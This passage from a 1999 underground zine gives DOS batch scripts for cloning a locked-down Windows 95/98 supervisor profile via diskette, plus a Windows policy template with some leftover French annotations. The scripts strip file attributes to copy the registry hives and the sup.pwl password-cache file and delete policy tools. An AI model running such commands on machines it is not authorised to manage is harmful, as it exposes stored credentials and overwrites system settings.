+exclusive mode MSDOS. They must be launched starting from Windows (use the
+Browser) and remain on the diskette
+---------------------------------------------------------------------------
+
+---------------------------------------------------------------------------
+@echo off
+cls
+echo PHOTO.BAT - NtWaK0 - 1/6/99
+echo.
+pause > nul
+
+set os=windows
+
+if exist c:\%os%\sup.pwl goto suite1
+echo The supervisor profile (sup) was not created yet. You cannot carry out sauve.bat
+echo at the moment
+goto fin
+
+:suite1
+if not exist a:\%os%\*.* goto suite2
+echo Photo.bat was already excuted ! now you should use Duplique.bat
+goto fin
+
+:suite2
+echo Please wait copying the files...
+echo.
+xcopy32 "c:\%os%\start menu\*.*" "a:\%os%\start menu\" /s /e > nul
+deltree /y "c:\%os%\profiles\sup\recent\*.*" > nul
+attrib -s -h -r c:\%os%\profiles\sup\user.dat
+xcopy32 "c:\%os%\profiles\*.*" "a:\%os%\profiles\" /s /e > nul
+attrib +r +h +s c:\%os%\profiles\sup\user.dat
+attrib -s -h -r c:\%os%\user.dat
+copy c:\%os%\user.dat a:\%os% > nul
+attrib +r +h +s c:\%os%\user.dat
+attrib -s -h -r c:\%os%\system.dat
+copy c:\%os%\system.dat a:\%os% > nul
+attrib +r +h +s c:\%os%\system.dat
+copy c:\%os%\sup.pwl a:\%os% > nul
+
+echo End.
+
+:fin
+set os=
+echo.
+
+---------------------------------------------------------------------------------
+DUPLIQUE.BAT     
+It is not possible to launch A:\duplique.bat without executing first 
+A:\photo.bat
+---------------------------------------------------------------------------------
+@echo off
+cls
+echo DUPLIQUE.BAT - NtWaK0 - 1/6/99
+echo.
+pause > nul
+
+set os=windows
+
+if not exist c:\%os%\sup.pwl goto suite1
+echo This PC is already protected !
+goto fin
+
+:suite1
+if exist a:\%os%\*.* goto suite2
+echo You should first execute Photo.bat on a protected PC !
+goto fin
+
+:suite2
+
+echo In the event of problem, the old Start Menu is recopied in the file
+echo Ex_Start_Menu registry User.dat  + System.dat is renamed echo to User.bak + System.bak
+echo.
+echo Copying files...
+echo.
+if not exist "c:\%os%\Ex_Start_Menu\*.*" goto premier
+deltree /y "c:\%os%\Ex_Start_Menu\*.*" > nul
+echo New installation.
+echo.
+
+:premier
+xcopy32 "c:\%os%\start menu\*.*" "c:\%os%\Ex_Start_Menu\" /s /e > nul
+deltree /y "c:\%os%\start menu\*.*" > nul
+xcopy32 "a:\%os%\start menu\*.*" "c:\%os%\Start menu\" /s /e /v > nul
+xcopy32 "a:\%os%\profiles\*.*" "c:\%os%\Profiles\" /s /e /v > nul
+
+attrib -s -h -r c:\%os%\user.dat
+if exist c:\%os%\user.bak del c:\%os%\user.bak
+rename c:\%os%\user.dat User.bak
+copy a:\%os%\User.dat c:\%os% > nul
+copy c:\%os%\user.dat c:\%os%\User.stu > nul
+attrib +r +h +s c:\%os%\user.dat
+attrib +r +h +s c:\%os%\user.stu
+
+attrib -s -h -r c:\%os%\system.dat
+if exist c:\%os%\system.bak del c:\%os%\system.bak
+rename c:\%os%\system.dat system.bak
+copy a:\%os%\System.dat c:\%os% > nul
+copy c:\%os%\system.dat c:\%os%\System.stu > nul
+attrib +r +h +s c:\%os%\system.dat
+attrib +r +h +s c:\%os%\system.stu
+
+copy a:\%os%\Sup.pwl c:\%os% > nul
+copy a:\Nettoie.bat c:\%os% > nul
+copy a:\Sauve.bat c:\%os% > nul
+copy a:\Explore.exe c:\%os%\system > nul
+copy a:\Explore.psw c:\%os%\system > nul
+if exist c:\%os%\poledit.exe del c:\%os%\poledit.exe
+
+echo End. Now you should restart your computer.
+
+:fin
+set os=
+echo.
+---------------------------------------------------------------------------
+
+
+Registry Keys
+CLASS MACHINE                                                                                                                                                                                                                                                  
+
+
+                            
+
+CATEGORY !!Network
+KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Network
+
+	CATEGORY !!AccessControl
+
+		POLICY !!AccessControl_User
+		KEYNAME System\CurrentControlSet\Services\VxD\FILESEC
+		VALUENAME Start
+		VALUEON NUMERIC 0 VALUEOFF DELETE
+
+		ACTIONLISTON
+			KEYNAME System\CurrentControlSet\Services\VxD\FILESEC
+			VALUENAME StaticVxD VALUE filesec.vxd
+		END ACTIONLISTON
+		ACTIONLISTOFF
+			KEYNAME Security\Provider
+			VALUENAME Platform_Type  VALUE NUMERIC 0
+			KEYNAME System\CurrentControlSet\Services\VxD\FILESEC
+			VALUENAME StaticVxD VALUE DELETE
+			KEYNAME System\CurrentControlSet\Services\VxD\NWSP
+			VALUENAME Start		VALUE DELETE
+			VALUENAME StaticVxD VALUE DELETE
+			KEYNAME System\CurrentControlSet\Services\VxD\MSSP
+			VALUENAME Start		VALUE DELETE
+			VALUENAME StaticVxD VALUE DELETE
+		END ACTIONLISTOFF
+
+			PART !!AuthenticatorName EDITTEXT
+			KEYNAME Security\Provider
+			VALUENAME Container
+			END PART
+
+			PART !!AuthenticatorType DROPDOWNLIST
+			KEYNAME Security\Provider
+			VALUENAME Platform_Type REQUIRED
+			ITEMLIST
+				NAME !!AT_NetWare VALUE NUMERIC 3
+				ACTIONLIST
+					KEYNAME System\CurrentControlSet\Services\VxD\NWSP
+					VALUENAME StaticVxD VALUE nwsp.vxd
+					VALUENAME Start		VALUE NUMERIC 0
+					KEYNAME Security\Provider
+					VALUENAME Address_Book  VALUE nwab32.dll
+				END ACTIONLIST
+
+				NAME !!AT_NTAS  VALUE NUMERIC 2
+				ACTIONLIST
+					KEYNAME System\CurrentControlSet\Services\VxD\MSSP
+					VALUENAME StaticVxD VALUE mssp.vxd
+					VALUENAME Start		VALUE NUMERIC 0
+					KEYNAME Security\Provider
+					VALUENAME Address_Book  VALUE msab32.dll
+				END ACTIONLIST
+
+				NAME !!AT_NT  VALUE NUMERIC 1
+				ACTIONLIST
+					KEYNAME System\CurrentControlSet\Services\VxD\MSSP
+					VALUENAME StaticVxD VALUE mssp.vxd
+					VALUENAME Start		VALUE NUMERIC 0
+					KEYNAME Security\Provider
+					VALUENAME Address_Book  VALUE msab32.dll
+				END ACTIONLIST
+			END ITEMLIST
+			END PART
+		END POLICY
+	END CATEGORY  ; User-Level Security
+
+	CATEGORY !!Logon
+
+		POLICY !!LogonBanner
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Winlogon
+			PART !!LogonBanner_Caption EDITTEXT
+			VALUENAME "LegalNoticeCaption"
+			MAXLEN 255
+			DEFAULT !!LogonBanner_DefCaption
+			END PART
+
+			PART !!LogonBanner_Text EDITTEXT
+			VALUENAME "LegalNoticeText"
+ 			MAXLEN 255
+			DEFAULT !!LogonBanner_DefText
+			END PART
+		END POLICY
+
+		POLICY !!ValidatedLogon
+		KEYNAME Network\Logon
+		VALUENAME "MustBeValidated"
+		END POLICY
+	END CATEGORY
+
+	
+
+CATEGORY !!NWClient
+	KEYNAME System\CurrentControlSet\Services\VxD\NWREDIR
+
+		POLICY !!PrefServer
+		KEYNAME System\CurrentControlSet\Services\NWNP32\NetworkProvider
+			PART !!PrefServerName EDITTEXT REQUIRED
+			VALUENAME "AuthenticatingAgent"
+			MAXLEN 48
+			END PART
+		END POLICY
+
+		POLICY !!SupportLFN
+			PART !!SupportLFNsOn DROPDOWNLIST REQUIRED
+			VALUENAME "SupportLFN"
+			ITEMLIST
+				NAME !!LFN_No311	VALUE NUMERIC 1
+				NAME !!LFN_All	VALUE NUMERIC 2
+			END ITEMLIST
+
+			END PART
+		END POLICY
+
+		POLICY !!SearchMode
+			PART !!SearchMode1 NUMERIC
+			VALUENAME SearchMode
+			MIN 0 MAX 7 DEFAULT 0 
+			END PART	
+		END POLICY
+
+		POLICY !!DisableAutoNWLogin
+			KEYNAME System\CurrentControlSet\Services\NWNP32\NetworkProvider
+			VALUENAME DisableDefaultPasswords		
+		END POLICY
+
+	END CATEGORY	; Microsoft Netware-Compatible Network
+
+	CATEGORY !!MSClient
+
+		POLICY !!LogonDomain
+		KEYNAME Network\Logon
+		VALUENAME "LMLogon"
+			PART !!DomainName	EDITTEXT REQUIRED
+			MAXLEN 15
+			KEYNAME System\CurrentControlSet\Services\MSNP32\NetworkProvider
+			VALUENAME AuthenticatingAgent
+			END PART
+
+			PART !!DomainLogonConfirmation CHECKBOX
+			KEYNAME Network\Logon
+			VALUENAME DomainLogonMessage
+			END PART
+
+			PART !!NoDomainPwdCaching CHECKBOX
+			KEYNAME Network\Logon
+			VALUENAME NoDomainPwdCaching
+			END PART
+		END POLICY
+
+		POLICY !!Workgroup
+		KEYNAME System\CurrentControlSet\Services\VxD\VNETSUP
+			PART !!WorkgroupName EDITTEXT REQUIRED
+			VALUENAME "Workgroup"
+			MAXLEN 15
+			END PART
+		END POLICY
+
+		POLICY !!AlternateWorkgroup
+		KEYNAME System\CurrentControlSet\Services\VxD\VREDIR
+			PART !!WorkgroupName EDITTEXT REQUIRED
+			VALUENAME "Workgroup"
+			MAXLEN 15
+			END PART
+		END POLICY
+
+	END CATEGORY	; Microsoft Network
+
+	CATEGORY !!NWServer
+
+		POLICY !!DisableSAP
+			KEYNAME System\CurrentControlSet\Services\NcpServer\Parameters
+			VALUENAME Use_Sap
+			VALUEON "0" VALUEOFF "1"
+			ACTIONLISTON
+				KEYNAME System\CurrentControlSet\Services\NcpServer\Parameters\Ndi\Params\Use_Sap
+				VALUENAME "" VALUE "0"
+			END ACTIONLISTON
+			ACTIONLISTOFF
+				KEYNAME System\CurrentControlSet\Services\NcpServer\Parameters\Ndi\Params\Use_Sap
+				VALUENAME "" VALUE "1"
+			END ACTIONLISTOFF
+		END POLICY
+	END CATEGORY
+
+
+
+
+	CATEGORY !!Passwords
+
+		POLICY !!HideSharePasswords
+		VALUENAME "HideSharePwds"
+		END POLICY
+
+		POLICY !!DisablePasswordCaching
+		VALUENAME "DisablePwdCaching"
+		END POLICY
+
+		POLICY !!RequireAlphaNum
+		VALUENAME "AlphanumPwds"
+		END POLICY
+
+		POLICY !!MinimumPwdLen
+			PART !!MPL_Length NUMERIC REQUIRED
+			MIN 1 MAX 8 DEFAULT 3
+			VALUENAME MinPwdLen
+			END PART
+		END POLICY
+	END CATEGORY	; Passwords
+
+	CATEGORY !!RemoteAccess
+
+		POLICY !!RemoteAccess_Disable
+		VALUENAME "NoDialIn"
+		END POLICY
+	END CATEGORY	; Remote Access
+
+	CATEGORY !!Sharing
+
+		POLICY !!DisableFileSharing
+		VALUENAME "NoFileSharing"
+		END POLICY
+
+		POLICY !!DisablePrintSharing
+		VALUENAME "NoPrintSharing"
+		END POLICY
+    	END CATEGORY	; Sharing	
+
+	CATEGORY !!SNMP
+
+		POLICY !!Communities
+		KEYNAME System\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities
+			PART !!CommunitiesListbox LISTBOX
+				VALUEPREFIX ""
+			END PART
+		END POLICY
+
+		POLICY !!PermittedManagers
+		KEYNAME System\CurrentControlSet\Services\SNMP\Parameters\PermittedManagers
+			PART !!PermittedManagersListbox LISTBOX
+				VALUEPREFIX ""
+			END PART
+		END POLICY
+
+		POLICY !!Traps_Public
+		KEYNAME System\CurrentControlSet\Services\SNMP\Parameters\TrapConfiguration\Public
+			PART !!Traps_PublicListbox LISTBOX
+				VALUEPREFIX ""
+			END PART
+		END POLICY
+
+		POLICY !!InternetMIB
+		KEYNAME System\CurrentControlSet\Services\SNMP\Parameters\RFC1156Agent
+			PART !!ContactName EDITTEXT REQUIRED
+			VALUENAME sysContact			
+			END PART
+
+			PART !!Location EDITTEXT REQUIRED
+			VALUENAME sysLocation
+			END PART
+		END POLICY
+
+	END CATEGORY
+
+	CATEGORY !!Update
+
+		POLICY !!RemoteUpdate
+		KEYNAME System\CurrentControlSet\Control\Update
+		ACTIONLISTOFF
+			VALUENAME "UpdateMode" VALUE NUMERIC 0
+		END ACTIONLISTOFF
+
+			PART !!UpdateMode DROPDOWNLIST REQUIRED
+			VALUENAME "UpdateMode"
+			ITEMLIST
+				NAME !!UM_Automatic VALUE NUMERIC 1
+				NAME !!UM_Manual	VALUE NUMERIC 2
+			END ITEMLIST
+			END PART
+
+			PART !!UM_Manual_Path EDITTEXT
+			VALUENAME "NetworkPath"
+			END PART
+
+			PART !!DisplayErrors CHECKBOX
+			VALUENAME "Verbose"
+			END PART
+		
+			PART !!LoadBalance CHECKBOX
+			VALUENAME "LoadBalance"
+			END PART
+		END POLICY
+
+	END CATEGORY	; Update
+
+END CATEGORY	; Network
+
+CATEGORY !!System
+KEYNAME Software\Microsoft\Windows\CurrentVersion\Setup
+
+	POLICY !!EnableUserProfiles
+		KEYNAME Network\Logon
+		VALUENAME UserProfiles                   les profils sont activés par la boîte de dialogue: "Propriétés pour Mots de passe " 
+	END POLICY
+
+	POLICY !!NetworkSetupPath
+		PART !!NetworkSetupPath_Path EDITTEXT REQUIRED
+		VALUENAME "SourcePath"
+		END PART
+	END POLICY
+
+	POLICY !!NetworkTourPath
+		PART !!NetworkTourPath_Path EDITTEXT REQUIRED
+		VALUENAME "TourPath"
+		END PART
+		PART !!NetworkTourPath_TIP TEXT END PART
+	END POLICY
+
+	POLICY !!Run
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Run
+		PART !!RunListbox LISTBOX EXPLICITVALUE
+		END PART
+	END POLICY
+
+	POLICY !!RunOnce
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\RunOnce
+		PART !!RunOnceListbox LISTBOX EXPLICITVALUE
+		END PART
+	END POLICY
+
+	POLICY !!RunServices
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\RunServices
+		PART !!RunServicesListbox LISTBOX EXPLICITVALUE
+		END PART
+	END POLICY
+END CATEGORY
+
+
+CLASS USER
+
+CATEGORY !!ControlPanel
+
+	CATEGORY !!CPL_Display
+
+		POLICY !!CPL_Display_Restrict
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\System
+			PART !!CPL_Display_Disable CHECKBOX
+			VALUENAME NoDispCPL
+			END PART
+
+			PART !!CPL_Display_HideBkgnd CHECKBOX
+			VALUENAME NoDispBackgroundPage
+			END PART
+
+			PART !!CPL_Display_HideScrsav CHECKBOX
+			VALUENAME NoDispScrSavPage
+			END PART
+
+			PART !!CPL_Display_HideAppearance CHECKBOX
+			VALUENAME NoDispAppearancePage
+			END PART
+
+			PART !!CPL_Display_HideSettings CHECKBOX
+			VALUENAME NoDispSettingsPage
+			END PART
+		END POLICY
+	END CATEGORY	; Display
+
+	CATEGORY !!CPL_Network
+
+		POLICY !!CPL_Network_Restrict
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Network
+			PART !!CPL_Network_Disable CHECKBOX
+			VALUENAME NoNetSetup
+			END PART
+	
+			PART !!CPL_Network_HideID CHECKBOX
+			VALUENAME NoNetSetupIDPage
+			END PART
+
+			PART !!CPL_Network_HideAccessCtrl CHECKBOX
+			VALUENAME NoNetSetupSecurityPage
+			END PART
+		END POLICY
+	END CATEGORY	; Network
+
+	CATEGORY !!CPL_Security
+
+		POLICY !!CPL_Security_Restrict
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\System
+			PART !!CPL_Security_Disable CHECKBOX
+			VALUENAME NoSecCPL
+			END PART
+
+			PART !!CPL_Security_HideSetPwds CHECKBOX
+			VALUENAME NoPwdPage
+			END PART
+
+			PART !!CPL_Security_HideRemoteAdmin CHECKBOX
+			VALUENAME NoAdminPage
+			END PART
+
+			PART !!CPL_Security_HideProfiles CHECKBOX
+			VALUENAME NoProfilePage
+			END PART
+		END POLICY
+	END CATEGORY	; Security
+
+	CATEGORY !!CPL_Printers
+
+		POLICY !!CPL_Printers_Restrict
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+			PART !!CPL_Printers_HidePages CHECKBOX
+			VALUENAME NoPrinterTabs
+			END PART
+
+			PART !!CPL_Printers_DisableRemoval CHECKBOX
+			VALUENAME NoDeletePrinter
+			END PART
+
+			PART !!CPL_Printers_DisableAdd CHECKBOX
+			VALUENAME NoAddPrinter
+			END PART
+		END POLICY
+	END CATEGORY	; Printers
+
+	CATEGORY !!CPL_System
+
+		POLICY !!CPL_System_Restrict
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\System
+			PART !!CPL_System_HideDevMgr CHECKBOX
+			VALUENAME NoDevMgrPage
+			END PART
+
+			PART !!CPL_System_HideConfig CHECKBOX
+			VALUENAME NoConfigPage
+			END PART
+
+			PART !!CPL_System_NoFileSys CHECKBOX
+			VALUENAME NoFileSysPage
+			END PART
+
+			PART !!CPL_System_NoVirtMem CHECKBOX
+			VALUENAME NoVirtMemPage
+			END PART
+
+		END POLICY
+	END CATEGORY	; System
+
+END CATEGORY	; Control Panel
+
+CATEGORY !!Desktop
+KEYNAME "Control Panel\Desktop"
+
+	POLICY !!Wallpaper
+		PART !!WallpaperName COMBOBOX REQUIRED
+		SUGGESTIONS
+			!!Wallpaper1 !!Wallpaper2 !!Wallpaper3 !!Wallpaper4 !!Wallpaper5
+			!!Wallpaper6 !!Wallpaper7 !!Wallpaper8 !!Wallpaper9 !!Wallpaper10
+		END SUGGESTIONS
+		VALUENAME "Wallpaper"              (voir page 15)
+		END PART
+
+		PART !!TileWallpaper CHECKBOX DEFCHECKED
+		VALUENAME "TileWallpaper"
+		VALUEON "1" VALUEOFF "0"
+		END PART
+	END POLICY
+
+
+
+
+	POLICY !!ColorScheme
+		PART !!SchemeName DROPDOWNLIST
+		KEYNAME "Control Panel\Appearance"
+		VALUENAME Current REQUIRED
+		ITEMLIST
+			(liste de modèles de couleur effacée car trop longue et sans grand intérêt)
+		END ITEMLIST
+		END PART
+	END POLICY
+END CATEGORY	; desktop
+
+CATEGORY !!Network
+KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Network
+
+	CATEGORY !!Sharing
+
+		POLICY !!DisableFileSharingCtrl
+		VALUENAME NoFileSharingControl
+		END POLICY
+
+		POLICY !!DisablePrintSharingCtrl
+		VALUENAME NoPrintSharingControl
+		END POLICY
+	END CATEGORY  ; Sharing
+END CATEGORY  ; Network
+
+CATEGORY !!Shell
+KEYNAME "Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
+
+	CATEGORY !!CustomFolders
+
+		POLICY !!CustomFolders_Programs
+			PART !!CustomFolders_ProgramsPath EDITTEXT REQUIRED
+			VALUENAME "Programs"
+			END PART
+		END POLICY
+
+		POLICY !!CustomFolders_Desktop
+			PART !!CustomFolders_DesktopPath EDITTEXT REQUIRED
+			VALUENAME "Desktop"
+			END PART
+		END POLICY
+
+		POLICY !!HideStartMenuSubfolders
+			KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+			VALUENAME NoStartMenuSubFolders
+			PART !!HideStartMenuSubfolders_Tip1 TEXT  END PART
+			PART !!HideStartMenuSubfolders_Tip2 TEXT  END PART
+		END POLICY
+
+		POLICY !!CustomFolders_Startup
+			PART !!CustomFolders_StartupPath EDITTEXT REQUIRED
+			VALUENAME "Startup"
+			END PART
+		END POLICY
+
+		POLICY !!CustomFolders_NetHood
+			PART !!CustomFolders_NetHoodPath EDITTEXT REQUIRED
+			VALUENAME "NetHood"
+			END PART
+		END POLICY
+	
+		POLICY !!CustomFolders_StartMenu
+			PART !!CustomFolders_StartMenuPath EDITTEXT REQUIRED
+			VALUENAME "Start Menu"
+			END PART
+		END POLICY
+	END CATEGORY
+
+	CATEGORY !!Restrictions
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+
+			POLICY !!RemoveRun
+			VALUENAME "NoRun"
+			END POLICY
+
+			POLICY !!RemoveFolders
+			VALUENAME "NoSetFolders"
+			END POLICY
+
+			POLICY !!RemoveTaskbar
+			VALUENAME "NoSetTaskbar"
+			END POLICY
+
+			POLICY !!RemoveFind
+			VALUENAME "NoFind"
+			END POLICY
+
+			POLICY !!HideDrives
+			VALUENAME "NoDrives"
+			VALUEON NUMERIC 67108863	; low 26 bits on (1 bit per drive)
+			END POLICY
+
+			POLICY !!HideNetHood
+			VALUENAME "NoNetHood"
+			END POLICY
+
+			POLICY !!NoEntireNetwork
+				KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Network
+				VALUENAME "NoEntireNetwork"
+			END POLICY
+
+			POLICY !!NoWorkgroupContents
+				KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Network
+				VALUENAME "NoWorkgroupContents"
+			END POLICY
+
+			POLICY !!HideDesktop
+			VALUENAME "NoDesktop"
+			END POLICY
+
+			POLICY !!DisableClose
+			VALUENAME "NoClose"
+			END POLICY
+
+			POLICY !!NoSaveSettings
+			VALUENAME "NoSaveSettings"
+			END POLICY
+
+	END CATEGORY													   
+END CATEGORY	; Shell
+
+CATEGORY !!System
+KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\System
+
+	CATEGORY !!Restrictions
+
+  		POLICY !!DisableRegedit
+		VALUENAME DisableRegistryTools
+		END POLICY
+
+		POLICY !!RestrictApps
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+		VALUENAME RestrictRun
+          			PART !!RestrictAppsList LISTBOX
+           + liste			KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun
+				VALUEPREFIX ""
+			END PART
+		END POLICY
+
+		POLICY !!DisableMSDOS
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp
+		VALUENAME Disabled
+		END POLICY
+
+		POLICY !!DisableSingleMSDOS
+		KEYNAME Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp
+		VALUENAME NoRealMode
+		END POLICY
+
+	END CATEGORY
+END CATEGORY
+
+---------------------------------------------------------------------------
+
+                   \\\___///
+                  \\  - -  //
+          Live Well(  @ @  )Do Good
+ +---------------oOOo-(_)-oOOo--------------------------------------+
+ | NtWak0  . --:)MCSEx2, Telcom. Eng., Security Senior              |
+ |"Kn0w13dg3 i5 0n1y p0w3r if U hav3 th3 wi5d0m t0 us3 i7 c0rr3c71y"|
+ |"I7'5 nic3 70 b3 imp0r7an7. Bu7 i7'5 m0r3 imp0r7an7 70 b3 nic3"   |
+ +------------------------Oooo--------------------------------------+
+
+---------------------------------------------------------------------------
+               L E G I O N S  O F  T H E  U N D E R G R O U N D 
+---------------------------------------------------------------------------
+Send Submissions! kv@legions.org  | digi@wintermute.unixgeeks.com
+Send Comments!    kv@legions.org  | digi@wintermute.unixgeeks.com
+Send Money! Please send email,so we can direct you to our swissbank account 
+
+                     [This has been a LoU production]
